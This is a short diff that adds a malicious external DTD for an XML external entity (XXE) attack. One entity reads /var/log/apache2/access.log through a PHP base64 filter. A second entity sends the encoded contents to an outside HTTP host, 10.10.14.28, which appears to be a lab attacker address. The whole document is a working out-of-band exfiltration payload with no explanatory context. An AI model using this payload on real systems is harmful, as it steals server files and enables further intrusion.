@@ -1,0 +1,3 @@
+<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/var/log/apache2/access.log">
+<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://10.10.14.28/exfil-b64/var/log/apache2/access.log?f=%data;'>">
+
